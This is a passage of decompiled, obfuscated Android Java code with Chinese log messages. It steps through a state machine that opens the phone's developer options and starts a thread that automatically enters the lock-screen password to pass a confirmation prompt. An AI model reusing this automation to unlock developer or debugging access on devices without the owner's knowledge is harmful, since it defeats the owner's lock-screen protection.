            t60.m214714d6("OpenDevDelegate", "触发自动密码输入（模拟ConfirmLockDelegate）");
            new Thread(new kl0(this, 0)).start();
        }
        if (i < 0) {
            t60.m214714d6("OpenDevDelegate", "t() → 调度 P()（关于手机窗口）因为 stateCode=" + i + " < 0");
            m211987d0(new RunnableC0503fo(this, 0, 4));
        }
        int i3 = 2;
        if (((OpenDevelopmentDelegate$State) this.f53795a3.get()).f53753a0 < 2) {
            t60.m214714d6("OpenDevDelegate", "t() → 调度 T()（版本信息窗口）因为 stateCode=" + ((OpenDevelopmentDelegate$State) this.f53795a3.get()).f53753a0 + " < 2");
            m211987d0(new RunnableC0503fo(this, i2, 4));
        }
        int i4 = 4;
        if (((OpenDevelopmentDelegate$State) this.f53795a3.get()).f53753a0 < 4) {
            m211987d0(new RunnableC0503fo(this, i3, 4));
        }
        if (((OpenDevelopmentDelegate$State) this.f53795a3.get()).f53753a0 <= 4) {
            m211987d0(new RunnableC0503fo(this, 3, 4));
        }
        if (this.f53795a3.get() == OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENTER_CONFIRM_LOCK_WIN) {
            m211987d0(new RunnableC0503fo(this, i4, 4));
        }
        if (this.f53795a3.get() == OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_PREPARE_CONFIRM_LOCK_WIN || this.f53795a3.get() == OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_IS_CONFIRM_SUCCESS) {
            m211987d0(new RunnableC0503fo(this, 5, 4));
        }
        if (this.f53795a3.get() == OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_WIN_CHECK) {
            m211987d0(new RunnableC0503fo(this, 6, 4));
        }
        if (this.f53795a3.get() == OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_WIN_PREPARE) {
            m211987d0(new RunnableC0503fo(this, 7, 4));
        }
    }
}
